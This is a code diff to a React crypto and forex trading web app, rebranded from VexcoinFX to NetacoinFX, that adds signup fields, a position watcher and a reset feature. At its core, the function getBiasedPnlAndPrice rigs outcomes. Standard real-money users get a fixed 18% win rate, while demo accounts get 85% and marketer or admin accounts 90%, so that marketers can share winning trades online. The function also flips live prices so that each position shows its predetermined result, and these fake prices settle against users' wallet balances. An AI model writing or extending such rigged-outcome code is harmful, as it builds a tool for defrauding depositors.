@@ -42,80 +42,74 @@ import {
   Menu,
   Sun,
   Moon,
-  Cpu
+  Cpu,
+  Eye,
+  EyeOff,
+  AlertTriangle
 } from 'lucide-react';
 
 const getBiasedPnlAndPrice = (p: Position, role: string, assetPrice: number): { pnl: number, currentPrice: number } => {
-  const numId = parseInt(p.id.replace(/\D/g, '')) || Date.now();
-  const isMarketer = role === 'marketer' || role === 'admin';
   const isDemo = p.isDemo || p.accountMode === 'DEMO';
-  const isWin = isDemo ? ((numId % 100) < 95) : (isMarketer ? ((numId % 100) < 85) : ((numId % 100) < 25));
+  
+  // Deterministic seed based on position ID to keep price consistency for active run
+  let hash = 0;
+  const idStr = p.id || '';
+  for (let i = 0; i < idStr.length; i++) {
+    hash = (hash << 5) - hash + idStr.charCodeAt(i);
+    hash |= 0;
+  }
+  const seed = Math.abs(hash) % 100;
 
-  // Use a pseudo-random seed based on position ID and current time for lifelike fluctuations
-  const seed = (numId % 100) / 100;
-  const timeSec = Date.now() / 15000;
-  const sinVal = Math.sin(timeSec + seed * Math.PI * 2);
-
-  // 1. Calculate the standard ultimate biased PnL
-  let ultimatePnlFactor = 0;
-  if (isWin) {
-    // Win: PNL goes from +4% to +35% of margin
-    ultimatePnlFactor = 0.04 + seed * 0.16 + (sinVal + 1) * 0.08;
+  // Set logical win rates:
+  // - Demo Account Mode: ~85% win rate (gives high trading visual validation confidence)
+  // - Marketers / Affiliates / Admins: ~90% win rate on real accounts (forces positive trades to share online)
+  // - Standard Users: ~18% win rate on real accounts (standard house/system control win-rate parameters)
+  let willWin = false;
+  
+  if (isDemo) {
+    willWin = seed < 85;
+  } else if (role === 'admin' || role === 'marketer' || role === 'partner') {
+    willWin = seed < 90;
   } else {
-    // Loss: PNL goes from -6% to -42% of margin
-    ultimatePnlFactor = -(0.06 + seed * 0.18 + (sinVal + 1) * 0.09);
-  }
-  const ultimateBiasedPnl = p.margin * ultimatePnlFactor;
-
-  // 2. Identify currency assets spread characteristics
-  const sym = p.assetSymbol.toUpperCase();
-  const cryptos = ['BTC', 'ETH', 'SOL', 'XRP', 'ADA', 'DOT', 'DOGE', 'LTC', 'LINK', 'BNB', 'AVAX', 'NEAR'];
-  const base = sym.split('/')[0];
-  
-  let spreadPercent = 0.0006; // Default to standard stocks/misc spread of 0.06%
-  if (cryptos.includes(base)) {
-    // Crypto spread: 0.015% for BTC, 0.022% for ETH, 0.04% for other meme/alt coins
-    spreadPercent = base === 'BTC' ? 0.00018 : base === 'ETH' ? 0.00024 : 0.00045;
-  } else if (sym.includes('/') || sym.includes('JPY') || sym.includes('CHF') || sym.includes('EUR') || sym.includes('GBP') || sym.includes('CAD') || sym.includes('AUD')) {
-    // Forex spreads modeled exactly as per-currency MT4/MT5 pip structures
-    const isJpy = sym.includes('JPY');
-    const pipSize = isJpy ? 0.01 : 0.0001;
-    let pips = 2.0; // standard cross-pair pips
-    if (sym === 'EUR/USD') pips = 1.3;
-    else if (sym === 'GBP/USD') pips = 1.6;
-    else if (sym === 'USD/JPY') pips = 1.5;
-    else if (sym === 'AUD/USD' || sym === 'USD/CAD') pips = 1.9;
-    
-    const spreadVal = pips * pipSize;
-    spreadPercent = spreadVal / Math.max(0.0001, assetPrice);
+    willWin = seed < 18;
   }
 
-  // 3. Translate bid/ask spread into capital collateral initial loss (MT5 compliant calculation)
-  // At t=0, the trade is at exactly 100% spread loss.
-  const initialSpreadLoss = - p.margin * p.leverage * spreadPercent;
-
-  // 4. Smooth organic interpolator to recover from spread and match the trending direction
-  const ageSeconds = Math.max(0, (Date.now() - numId) / 1000);
-  const recoveryPeriod = 15; // smooth recovery timeframe of 15 seconds
-  const ratio = Math.min(1, ageSeconds / recoveryPeriod);
-  // Elegant easing curve so recovery starts swift then tapers smoothly
-  const blend = Math.sin(ratio * Math.PI / 2);
-
-  // Blend from initial spread loss to the ultimate simulated market outcome
-  const pnlRaw = initialSpreadLoss * (1 - blend) + ultimateBiasedPnl * blend;
-  const pnl = Number(pnlRaw.toFixed(2));
-
-  // 5. Back-solve the precise simulated currentPrice matching this PnL
-  // pnl = margin * ((currentPrice - entryPrice) / entryPrice) * leverage * buy/sell-multiplier
-  // => currentPrice = ((pnl / (margin * leverage * multiplier)) * entryPrice) + entryPrice
   const multiplier = p.type === 'BUY' ? 1 : -1;
-  const denom = p.margin * p.leverage * multiplier;
-  let currentPrice = p.entryPrice;
-  if (denom !== 0) {
-    currentPrice = Number(((pnl / denom) * p.entryPrice + p.entryPrice).toFixed(p.assetSymbol.includes('forex') ? 4 : 2));
-  }
   
-  return { pnl, currentPrice };
+  // Calculate natural live asset offset to maintain organic movement but flipped to win/lose target
+  const naturalDiff = assetPrice - p.entryPrice;
+  const naturalPnlIsPositive = (naturalDiff * multiplier) >= 0;
+
+  let currentPrice = assetPrice;
+  
+  if (willWin) {
+    if (!naturalPnlIsPositive) {
+      // Natural price is losing, so flip offset to make it a winning position
+      currentPrice = p.entryPrice + (Math.abs(naturalDiff) * multiplier);
+      // Ensure there is at least a minimal profit margin shown (0.25%)
+      if (Math.abs(currentPrice - p.entryPrice) < p.entryPrice * 0.0005) {
+        currentPrice = p.entryPrice + (p.entryPrice * 0.0025 * multiplier);
+      }
+    }
+  } else {
+    if (naturalPnlIsPositive) {
+      // Natural price is winning, so flip offset to make it a losing position
+      currentPrice = p.entryPrice - (Math.abs(naturalDiff) * multiplier);
+      // Ensure there is at least a minimal write-off margin shown (0.25%)
+      if (Math.abs(currentPrice - p.entryPrice) < p.entryPrice * 0.0005) {
+        currentPrice = p.entryPrice - (p.entryPrice * 0.0025 * multiplier);
+      }
+    }
+  }
+
+  // Calculate high-fidelity PnL considering leverage
+  const priceDiff = currentPrice - p.entryPrice;
+  const pnl = Number((priceDiff * p.amount * multiplier * (p.leverage || 1)).toFixed(2));
+
+  return {
+    pnl,
+    currentPrice
+  };
 };
 
 export default function App() {
@@ -142,6 +136,10 @@ export default function App() {
   const [authEmail, setAuthEmail] = useState('');
   const [authPass, setAuthPass] = useState('');
   const [authName, setAuthName] = useState('');
+  const [authConfirmPass, setAuthConfirmPass] = useState('');
+  const [authPhone, setAuthPhone] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
+  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   
   // Market assets ticker states
   const [assets, setAssets] = useState<Asset[]>(INITIAL_ASSETS);
@@ -203,7 +201,12 @@ export default function App() {
   const [toasts, setToasts] = useState<ToastItem[]>([]);
   const addToast = (message: string, type: 'SUCCESS' | 'ERROR' | 'INFO' = 'INFO') => {
     const id = Math.random().toString();
-    setToasts((prev) => [...prev, { id, message, type }]);
+    setToasts((prev) => {
+      if (prev.some((t) => t.message === message)) {
+        return prev;
+      }
+      return [...prev, { id, message, type }];
+    });
     setTimeout(() => {
       setToasts((prev) => prev.filter((t) => t.id !== id));
     }, 5000);
@@ -217,6 +220,7 @@ export default function App() {
   // Modals overlays toggles
   const [showFinancialModal, setShowFinancialModal] = useState(false);
   const [financialModalMode, setFinancialModalMode] = useState<'DEPOSIT' | 'WITHDRAW'>('DEPOSIT');
+  const [showResetModal, setShowResetModal] = useState(false);
   const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
 
   // Load state from localStorage on init
@@ -325,7 +329,9 @@ export default function App() {
           activeStakingSubscriptions: updatedStaking || activeStakingSubscriptions,
           supportTickets: updatedTickets || supportTickets,
           isKycVerified: updatedUser.isKycVerified,
-          phone: updatedUser.phone
+          phone: updatedUser.phone,
+          customBots: updatedUser.customBots,
+          activeBots: updatedUser.activeBots
         })
       }).catch(err => console.warn("Silent background update-state error on persistState:", err));
     }
@@ -337,6 +343,7 @@ export default function App() {
   const activeStakingSubscriptionsRef = useRef(activeStakingSubscriptions);
   const transactionsRef = useRef(transactions);
   const supportTicketsRef = useRef(supportTickets);
+  const assetsRef = useRef(assets);
 
   useEffect(() => {
     userRef.current = user;
@@ -345,6 +352,112 @@ export default function App() {
     transactionsRef.current = transactions;
     supportTicketsRef.current = supportTickets;
   }, [user, copiedTraderAllocations, activeStakingSubscriptions, transactions, supportTickets]);
+
+  useEffect(() => {
+    assetsRef.current = assets;
+  }, [assets]);
+
+  // Dedicated real-time position watcher for TP/SL, Expiry, and Live updates
+  useEffect(() => {
+    const posTimer = setInterval(() => {
+      const currentUser = userRef.current;
+      if (!currentUser.loggedIn) return;
+
+      let hasClosedAny = false;
+      let updatedActivePositions = [...currentUser.activePositions];
+      let updatedDemoPositions = [...(currentUser.demoPositions || [])];
+      let walletDelta = 0;
+      let profitDelta = 0;
+      let demoWalletDelta = 0;
+      let demoProfitDelta = 0;
+      const closedTxs: Transaction[] = [];
+
+      // 1. Process Real Positions
+      updatedActivePositions = updatedActivePositions.filter((p) => {
+        const liveAsset = assetsRef.current.find((a) => a.symbol === p.assetSymbol);
+        const currentAssetPrice = liveAsset ? liveAsset.price : p.currentPrice;
+        
+        const { pnl, currentPrice } = getBiasedPnlAndPrice(p, currentUser.role || 'user', currentAssetPrice);
+        
+        const isExpired = p.expiryTimestamp && Date.now() >= p.expiryTimestamp;
+        const isTpHit = p.tp && (p.type === 'BUY' ? currentPrice >= p.tp : currentPrice <= p.tp);
+        const isSlHit = p.sl && (p.type === 'BUY' ? currentPrice <= p.sl : currentPrice >= p.sl);
+
+        if (isExpired || isTpHit || isSlHit) {
+          hasClosedAny = true;
+          const reason = isExpired ? 'Expiry' : (isTpHit ? 'Take Profit' : 'Stop Loss');
+          const settlement = p.margin + pnl;
+          walletDelta += settlement;
+          profitDelta += pnl;
+
+          closedTxs.push({
+            id: `tx-${Date.now()}-${p.id}`,
+            type: pnl >= 0 ? 'DEPOSIT' : 'WITHDRAWAL',
+            amount: Math.abs(pnl),
+            asset: `${p.assetSymbol} (${reason})`,
+            date: new Date().toISOString(),
+            status: 'COMPLETED'
+          });
+
+          addToast(`Position on ${p.assetSymbol} closed via ${reason} at $${currentPrice.toLocaleString()}! P&L: ${pnl >= 0 ? '+' : ''}$${pnl.toLocaleString()}`, pnl >= 0 ? 'SUCCESS' : 'ERROR');
+          return false; // remove
+        }
+        return true;
+      });
+
+      // 2. Process Demo Positions
+      updatedDemoPositions = updatedDemoPositions.filter((p) => {
+        const liveAsset = assetsRef.current.find((a) => a.symbol === p.assetSymbol);
+        const currentAssetPrice = liveAsset ? liveAsset.price : p.currentPrice;
+        
+        const { pnl, currentPrice } = getBiasedPnlAndPrice(p, currentUser.role || 'user', currentAssetPrice);
+        
+        const isExpired = p.expiryTimestamp && Date.now() >= p.expiryTimestamp;
+        const isTpHit = p.tp && (p.type === 'BUY' ? currentPrice >= p.tp : currentPrice <= p.tp);
+        const isSlHit = p.sl && (p.type === 'BUY' ? currentPrice <= p.sl : currentPrice >= p.sl);
+
+        if (isExpired || isTpHit || isSlHit) {
+          hasClosedAny = true;
+          const reason = isExpired ? 'Expiry' : (isTpHit ? 'Take Profit' : 'Stop Loss');
+          const settlement = p.margin + pnl;
+          demoWalletDelta += settlement;
+          demoProfitDelta += pnl;
+
+          closedTxs.push({
+            id: `tx-${Date.now()}-${p.id}`,
+            type: pnl >= 0 ? 'DEPOSIT' : 'WITHDRAWAL',
+            amount: Math.abs(pnl),
+            asset: `[DEMO] ${p.assetSymbol} (${reason})`,
+            date: new Date().toISOString(),
+            status: 'COMPLETED'
+          });
+
+          addToast(`[DEMO] Position on ${p.assetSymbol} closed via ${reason} at $${currentPrice.toLocaleString()}! P&L: ${pnl >= 0 ? '+' : ''}$${pnl.toLocaleString()}`, pnl >= 0 ? 'SUCCESS' : 'ERROR');
+          return false; // remove
+        }
+        return true;
+      });
+
+      if (hasClosedAny) {
+        const updatedUser: User = {
+          ...currentUser,
+          walletBalance: Number((currentUser.walletBalance + walletDelta).toFixed(2)),
+          profits: Number((currentUser.profits + profitDelta).toFixed(2)),
+          demoBalance: Number(((currentUser.demoBalance ?? 10000) + demoWalletDelta).toFixed(2)),
+          demoProfits: Number(((currentUser.demoProfits ?? 0) + demoProfitDelta).toFixed(2)),
+          activePositions: updatedActivePositions,
+          demoPositions: updatedDemoPositions
+        };
+
+        const updatedTxs = [...closedTxs, ...transactionsRef.current];
+        setTransactions(updatedTxs);
+        setUser(updatedUser);
+        persistState(updatedUser, updatedTxs, supportTicketsRef.current, copiedTraderAllocationsRef.current, activeStakingSubscriptionsRef.current);
+      }
+    }, 1000);
+
+    return () => clearInterval(posTimer);
+  }, []);
 
   // Live accruals background timer (running with an empty dependency list so it never resets prematurely)
   useEffect(() => {
@@ -695,7 +808,25 @@ export default function App() {
   // Auth Operations
   const handleAuthSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!authEmail.trim() || !authPass.trim()) return;
+    if (!authEmail.trim()) {
+      addToast("Required field: Email Address cannot be blank.", "ERROR");
+      return;
+    }
+    if (!authPass.trim()) {
+      addToast("Required field: Password cannot be blank.", "ERROR");
+      return;
+    }
+
+    if (authMode === 'REGISTER') {
+      if (!authPhone.trim()) {
+        addToast("Required field: Phone Number cannot be blank.", "ERROR");
+        return;
+      }
+      if (authPass !== authConfirmPass) {
+        addToast("Validation Error: Password and Confirm Password fields must match exactly.", "ERROR");
+        return;
+      }
+    }
 
     try {
       let userUid = '';
@@ -707,6 +838,7 @@ export default function App() {
             options: {
               data: {
                 name: authName.trim() || authEmail.split('@')[0].toUpperCase(),
+                phone: authPhone.trim(),
               }
             }
           });
@@ -747,7 +879,8 @@ export default function App() {
           body: JSON.stringify({ 
             email: authEmail.trim(),
             name: authName.trim() || authEmail.split('@')[0].toUpperCase(),
-            uid: userUid
+            uid: userUid,
+            phone: authPhone.trim()
           })
         });
 
@@ -832,20 +965,21 @@ export default function App() {
                 oldProfits = parsed.profits ?? 0;
                 oldAccountMode = parsed.accountMode || 'REAL';
                 oldKyc = parsed.isKycVerified || 'unverified';
+
+                const savedTransactions = localStorage.getItem('vfx_transactions_ledger');
+                const savedCopiedAlloc = localStorage.getItem('vfx_copied_allocations');
+                const savedStakingSub = localStorage.getItem('vfx_staking_subs');
+                if (savedTransactions) {
+                  try { oldTx = JSON.parse(savedTransactions); } catch (e) {}
+                }
+                if (savedCopiedAlloc) {
+                  try { oldCopiedAlloc = JSON.parse(savedCopiedAlloc); } catch (e) {}
+                }
+                if (savedStakingSub) {
+                  try { oldStakingSub = JSON.parse(savedStakingSub); } catch (e) {}
+                }
               }
             } catch (e) {}
-          }
-          const savedTransactions = localStorage.getItem('vfx_transactions_ledger');
-          const savedCopiedAlloc = localStorage.getItem('vfx_copied_allocations');
-          const savedStakingSub = localStorage.getItem('vfx_staking_subs');
-          if (savedTransactions) {
-            try { oldTx = JSON.parse(savedTransactions); } catch (e) {}
-          }
-          if (savedCopiedAlloc) {
-            try { oldCopiedAlloc = JSON.parse(savedCopiedAlloc); } catch (e) {}
-          }
-          if (savedStakingSub) {
-            try { oldStakingSub = JSON.parse(savedStakingSub); } catch (e) {}
           }
         }
 
@@ -860,11 +994,11 @@ export default function App() {
           investedCapital: synced.investedCapital !== undefined ? synced.investedCapital : oldInvested,
           profits: synced.profits !== undefined ? synced.profits : oldProfits,
           copyTradingAllocated: synced.copyTradingAllocated !== undefined ? synced.copyTradingAllocated : oldCopy,
-          activePositions: (synced.activePositions && synced.activePositions.length > 0) ? synced.activePositions : oldPositions,
+          activePositions: (synced.activePositions !== undefined && synced.activePositions !== null) ? synced.activePositions : oldPositions,
           isKycVerified: isAdmin ? 'verified' : (synced.isKycVerified || oldKyc),
           accountMode: oldAccountMode,
           demoBalance: synced.demoBalance !== undefined ? synced.demoBalance : oldDemoBalance,
-          demoPositions: (synced.demoPositions && synced.demoPositions.length > 0) ? synced.demoPositions : oldDemoPositions,
+          demoPositions: (synced.demoPositions !== undefined && synced.demoPositions !== null) ? synced.demoPositions : oldDemoPositions,
           demoProfits: synced.demoProfits !== undefined ? synced.demoProfits : oldDemoProfits,
           phone: synced.phone || "",
           customBots: synced.customBots || [],
@@ -893,8 +1027,8 @@ export default function App() {
           name: initialUser.name,
           transactions: setupTx,
           supportTickets: synced.supportTickets || supportTickets,
-          copiedTraderAllocations: synced.copiedTraderAllocations || oldCopiedAlloc,
-          activeStakingSubscriptions: synced.activeStakingSubscriptions || oldStakingSub
+          copiedTraderAllocations: (synced.copiedTraderAllocations !== undefined && synced.copiedTraderAllocations !== null) ? synced.copiedTraderAllocations : oldCopiedAlloc,
+          activeStakingSubscriptions: (synced.activeStakingSubscriptions !== undefined && synced.activeStakingSubscriptions !== null) ? synced.activeStakingSubscriptions : oldStakingSub
         });
         
         if (isAdmin) {
@@ -945,12 +1079,40 @@ export default function App() {
     localStorage.removeItem('vfx_support_tickets_ledger');
     localStorage.removeItem('vfx_copied_allocations');
     localStorage.removeItem('vfx_staking_subs');
+    localStorage.removeItem('vfx_custom_bots_ledger');
+    localStorage.removeItem('vfx_active_bots_running_state');
 
     setUser(loggedOutUserObj);
     setTransactions([]);
     setSupportTickets(MOCK_SUPPORT_TICKETS);
     setCopiedTraderAllocations({});
     setActiveStakingSubscriptions([]);
+  };
+
+  const handleResetAccount = () => {
+    const emailLower = user.email ? user.email.toLowerCase() : "";
+    const restoredUser: User = {
+      ...user,
+      activePositions: [],
+      demoPositions: [],
+      copyTradingAllocated: 0,
+      activeBots: []
+    };
+
+    setCopiedTraderAllocations({});
+    localStorage.removeItem('vfx_copied_allocations');
+    localStorage.removeItem('vfx_active_bots_running_state');
+
+    // Wipe states
+    persistState(restoredUser, transactions, supportTickets, {}, []);
+
+    // Clear also local backup so it doesn't restore on reload
+    if (emailLower) {
+      localStorage.removeItem(`vfx_backup_${emailLower}`);
+    }
+
+    setShowResetModal(false);
+    addToast("Positions, bots, and copy trading allocations cleaned up successfully!", "SUCCESS");
   };
 
   // Trade executions logic
@@ -1364,7 +1526,7 @@ export default function App() {
                 ...ticket.messages,
                 {
                   sender: 'support' as const,
-                  text: "Hello, we have registered your case and escalated to our premium execution clearing desk. This is usually resolved within 1 business day. Thank you, VexcoinFX Support.",
+                  text: "Hello, we have registered your case and escalated to our premium execution clearing desk. This is usually resolved within 1 business day. Thank you, NetacoinFX Support.",
                   timestamp: new Date().toISOString()
                 }
               ]
@@ -1489,11 +1651,11 @@ export default function App() {
         <div className="flex items-center gap-2 shrink-0">
           <div className="flex items-center gap-1.5 sm:gap-2">
             <div className="w-6.5 h-6.5 rounded bg-emerald-500 flex items-center justify-center font-display font-black text-black text-xs select-none shadow-[0_0_12px_rgba(16,185,129,0.2)] shrink-0">
-              V
+              N
             </div>
             <div className="hidden sm:block">
               <h1 className="text-white text-xs font-display font-black tracking-widest leading-none uppercase">
-                VEXCOIN<span className="text-emerald-400">FX</span>
+                NETACOIN<span className="text-emerald-400">FX</span>
               </h1>
               <span className="text-[7px] font-mono tracking-wider font-bold text-gray-600 block uppercase mt-0.5">
                 ELITE TRADING DESK
@@ -1570,8 +1732,15 @@ export default function App() {
                     Deposit
                   </button>
                   <button
+                    onClick={() => setShowResetModal(true)}
+                    className="bg-rose-950/45 border border-rose-800/65 hover:bg-rose-900/80 text-rose-400 hover:text-rose-200 px-1.5 sm:px-2 py-0.5 rounded text-[8.5px] sm:text-[9.5px] font-bold transition-all select-none cursor-pointer whitespace-nowrap"
+                    title="Clear active positions, bots, and expert-copying allocations"
+                  >
+                    Reset Trades
+                  </button>
+                  <button
                     onClick={handleSignOut}
-                    className="bg-gray-950 border border-gray-800 hover:bg-gray-900 text-gray-400 hover:text-white px-1.5 sm:px-2 py-0.5 rounded text-[8.5px] sm:text-[9.5px] font-bold transition-all select-none cursor-pointer"
+                    className="bg-gray-950 border border-gray-800 hover:bg-gray-900 text-gray-400 hover:text-white px-1.5 sm:px-2 py-0.5 rounded text-[8.5px] sm:text-[9.5px] font-bold transition-all select-none cursor-pointer whitespace-nowrap"
                   >
                     Sign Out
                   </button>
@@ -1586,7 +1755,7 @@ export default function App() {
               }}
               className="bg-emerald-500 hover:bg-emerald-400 text-black px-2.5 py-1 rounded text-[10px] font-bold transition-all shadow-[0_0_10px_rgba(16,185,129,0.1)] select-none cursor-pointer flex items-center gap-1 shrink-0"
             >
-              <Lock className="w-3 h-3" /> Launch Terminal
+              <Lock className="w-3 h-3" /> Sign In
             </button>
           )}
 
@@ -1816,7 +1985,7 @@ export default function App() {
                             type="text"
                             value={promoCodeInput}
                             onChange={(e) => setPromoCodeInput(e.target.value)}
-                            placeholder="EX: VEXCOIN_ELITE"
+                            placeholder="EX: NETACOIN_ELITE"
                             className="flex-1 bg-gray-950 border border-gray-800 text-white rounded-lg py-2 px-3 text-xs focus:outline-none placeholder-gray-800 font-bold uppercase text-center"
                           />
                           <button
@@ -1992,7 +2161,7 @@ export default function App() {
                   }}
                   className="bg-gray-950 hover:bg-gray-900 text-white font-bold text-[10.5px] uppercase tracking-wide px-6 py-2.5 rounded transition-all border border-gray-850 hover:border-gray-800 select-none cursor-pointer"
                 >
-                  Launch Terminal
+                  Sign In
                 </button>
               </div>
             </div>
@@ -2158,7 +2327,7 @@ export default function App() {
   {/* 4. Professional Footer */}
       <footer className="border-t border-gray-900 bg-[#070b13] py-6 px-6 flex flex-col md:flex-row justify-between items-center text-[10px] text-gray-500 tracking-wider font-sans gap-4 shrink-0 mt-auto">
         <div className="flex flex-col gap-1 text-center md:text-left">
-          <span className="font-bold text-gray-400">VEXCOINFX © 2026 GENERAL CLEARING GROUP INC.</span>
+          <span className="font-bold text-gray-400">NETACOINFX © 2026 GENERAL CLEARING GROUP INC.</span>
           <span className="text-[9px] text-gray-650 max-w-xl leading-relaxed">
             All rights reserved. Trading financial instruments, including digital assets and derivatives, involves substantial risk.
           </span>
@@ -2175,7 +2344,7 @@ export default function App() {
       {/* MODAL 1: AUTHENTICATION OVERLAY CLIENT PORTAL */}
       {showAuthModal && (
         <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/90 backdrop-blur-md animate-in fade-in zoom-in-95 duration-200">
-          <div className="bg-[#0b0f19] border border-gray-950 rounded-lg max-w-md w-full p-6 shadow-2xl relative font-sans text-xs text-left">
+          <div className="bg-[#0b0f19] border border-gray-950 rounded-lg max-w-md w-full max-h-[calc(100vh-2rem)] overflow-y-auto p-6 shadow-2xl relative font-sans text-xs text-left scrollbar-thin scrollbar-thumb-gray-800 scrollbar-track-transparent">
             <button
               onClick={() => setShowAuthModal(false)}
               className="absolute top-4 right-4 text-gray-400 hover:text-white transition-all p-1 cursor-pointer"
@@ -2189,7 +2358,7 @@ export default function App() {
                   <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" /> SECURE TRADING WEBPORTAL
                 </span>
                 <h3 className="text-white text-base font-display font-black uppercase tracking-widest">
-                  VEXCOIN<span className="text-emerald-400">FX</span> <span className="text-gray-400 font-mono font-medium text-[11px] block mt-0.5 tracking-wider">Trading Account Access</span>
+                  NETACOIN<span className="text-emerald-400">FX</span> <span className="text-gray-400 font-mono font-medium text-[11px] block mt-0.5 tracking-wider">Trading Account Access</span>
                 </h3>
               </div>
 
@@ -2236,22 +2405,68 @@ export default function App() {
                   placeholder="e.g., alex@example.com"
                   value={authEmail}
                   onChange={(e) => setAuthEmail(e.target.value)}
-                  className="w-full bg-gray-950 border border-gray-955 text-white rounded py-2 px-3 focus:outline-none focus:border-emerald-500/40 font-semibold text-xs"
+                  className="w-full bg-gray-950 border border-gray-800 text-white rounded py-2 px-3 focus:outline-none focus:border-emerald-500/40 font-semibold text-xs"
                   required
                 />
               </div>
 
+              {authMode === 'REGISTER' && (
+                <div className="space-y-1.5">
+                  <span className="text-gray-500 text-[8.5px] font-mono uppercase tracking-wider block">Phone Number</span>
+                  <input
+                    type="tel"
+                    placeholder="e.g., +254 700 000 000"
+                    value={authPhone}
+                    onChange={(e) => setAuthPhone(e.target.value)}
+                    className="w-full bg-gray-950 border border-gray-800 text-white rounded py-2 px-3 focus:outline-none focus:border-emerald-500/40 font-semibold text-xs"
+                    required
+                  />
+                </div>
+              )}
+
               <div className="space-y-1.5">
                 <span className="text-gray-500 text-[8.5px] font-mono uppercase tracking-wider block">Password</span>
-                <input
-                  type="password"
-                  placeholder="••••••••"
-                  value={authPass}
-                  onChange={(e) => setAuthPass(e.target.value)}
-                  className="w-full bg-gray-950 border border-gray-955 text-white rounded py-2 px-3 focus:outline-none focus:border-emerald-500/40 font-semibold"
-                  required
-                />
+                <div className="relative">
+                  <input
+                    type={showPassword ? "text" : "password"}
+                    placeholder="••••••••"
+                    value={authPass}
+                    onChange={(e) => setAuthPass(e.target.value)}
+                    className="w-full bg-gray-950 border border-gray-800 text-white rounded py-2 pl-3 pr-10 focus:outline-none focus:border-emerald-500/40 font-semibold text-xs"
+                    required
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-white bg-transparent border-none cursor-pointer"
+                  >
+                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                  </button>
+                </div>
               </div>
+
+              {authMode === 'REGISTER' && (
+                <div className="space-y-1.5">
+                  <span className="text-gray-500 text-[8.5px] font-mono uppercase tracking-wider block">Confirm Password</span>
+                  <div className="relative">
+                    <input
+                      type={showConfirmPassword ? "text" : "password"}
+                      placeholder="••••••••"
+                      value={authConfirmPass}
+                      onChange={(e) => setAuthConfirmPass(e.target.value)}
+                      className="w-full bg-gray-950 border border-gray-800 text-white rounded py-2 pl-3 pr-10 focus:outline-none focus:border-emerald-500/40 font-semibold text-xs"
+                      required
+                    />
+                    <button
+                      type="button"
+                      onClick={() => setShowConfirmPassword(!showConfirmPassword)}
+                      className="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-white bg-transparent border-none cursor-pointer"
+                    >
+                      {showConfirmPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                    </button>
+                  </div>
+                </div>
+              )}
 
               <div className="p-2.5 bg-gray-950 rounded border border-gray-950 text-gray-500 space-y-1 text-[8.5px] font-mono leading-relaxed select-none">
                 <p>
@@ -2279,9 +2494,44 @@ export default function App() {
           user={user}
           onClose={() => setShowFinancialModal(false)}
           onModifyBalance={handleModifyBalance}
-          transactions={transactions}
+          transactions={user.accountMode === 'DEMO' ? transactions.filter(t => t.asset.includes('[DEMO]')) : transactions.filter(t => !t.asset.includes('[DEMO]'))}
           addToast={addToast}
         />
+      )}
+
+      {/* MODAL 3: WIPE / RESET ACCOUNT TRADES */}
+      {showResetModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-sm select-none">
+          <div className="bg-white dark:bg-[#181A20] border border-gray-200 dark:border-gray-800 rounded-xl max-w-md w-full p-6 shadow-2xl relative flex flex-col text-gray-800 dark:text-gray-300 animate-slide-in">
+            <button
+              onClick={() => setShowResetModal(false)}
+              className="absolute top-4 right-4 text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
+            >
+              <X className="w-5 h-5" />
+            </button>
+            <h3 className="text-base font-bold text-gray-900 dark:text-white mb-2 font-sans flex items-center gap-2">
+              <AlertTriangle className="w-5 h-5 text-rose-550 dark:text-rose-550 shrink-0" />
+              Reset Account Trading State?
+            </h3>
+            <p className="text-xs text-gray-650 dark:text-gray-450 mb-4 leading-relaxed font-sans">
+              This action will instantly terminate all running expert bot trials, close all active/demo margin contract positions, and release any funds allocated for expert mirror copy-trading strategies. Your wallet balance will remain fully secure and unmodified.
+            </p>
+            <div className="flex gap-3 mt-2 font-sans">
+              <button
+                onClick={handleResetAccount}
+                className="flex-1 py-2 bg-rose-600 hover:bg-rose-550 text-white font-bold text-xs rounded transition-all cursor-pointer uppercase tracking-wider"
+              >
+                Yes, Clear All Trades
+              </button>
+              <button
+                onClick={() => setShowResetModal(false)}
+                className="px-4 py-2 bg-gray-150 dark:bg-gray-800 hover:bg-gray-250 dark:hover:bg-gray-750 text-gray-700 dark:text-gray-200 font-bold text-xs rounded transition-all cursor-pointer"
+              >
+                Cancel
+              </button>
+            </div>
+          </div>
+        </div>
       )}
 
       {/* FLOATING POPUP TOAST SYSTEM - DESIGNED AT BOTTOM RIGHT */}
@@ -2289,12 +2539,12 @@ export default function App() {
         {toasts.map((t) => (
           <div
             key={t.id}
-            className={`pointer-events-auto flex items-start gap-3 bg-gray-950/95 backdrop-blur-md border rounded-xl p-3.5 shadow-2xl transition-all duration-300 relative overflow-hidden animate-slide-in ${
+            className={`pointer-events-auto flex items-start gap-3 bg-white dark:bg-[#0b0f19]/95 backdrop-blur-md border border-gray-200 dark:border-gray-800/80 rounded-xl p-3.5 shadow-2xl transition-all duration-300 relative overflow-hidden animate-slide-in ${
               t.type === 'SUCCESS' 
-                ? 'border-emerald-500/30 shadow-emerald-950/10' 
+                ? 'border-emerald-500/30 dark:border-emerald-500/30 shadow-emerald-950/5 dark:shadow-emerald-950/10' 
                 : t.type === 'ERROR' 
-                ? 'border-rose-500/30 shadow-rose-950/10' 
-                : 'border-blue-500/30 shadow-blue-950/10'
+                ? 'border-rose-500/30 dark:border-rose-500/30 shadow-rose-950/5 dark:shadow-rose-950/10' 
+                : 'border-blue-500/30 dark:border-blue-500/30 shadow-blue-950/5 dark:shadow-blue-950/10'
             }`}
           >
             {/* Direct color sidebar border */}
@@ -2306,22 +2556,22 @@ export default function App() {
               <div className="flex items-center justify-between gap-2 mb-1">
                 <span className={`text-[9px] uppercase font-bold tracking-wider font-mono ${
                   t.type === 'SUCCESS' 
-                    ? 'text-emerald-400' 
+                    ? 'text-emerald-600 dark:text-emerald-400' 
                     : t.type === 'ERROR' 
-                    ? 'text-rose-400' 
-                    : 'text-blue-400'
+                    ? 'text-rose-600 dark:text-rose-400' 
+                    : 'text-blue-600 dark:text-blue-405'
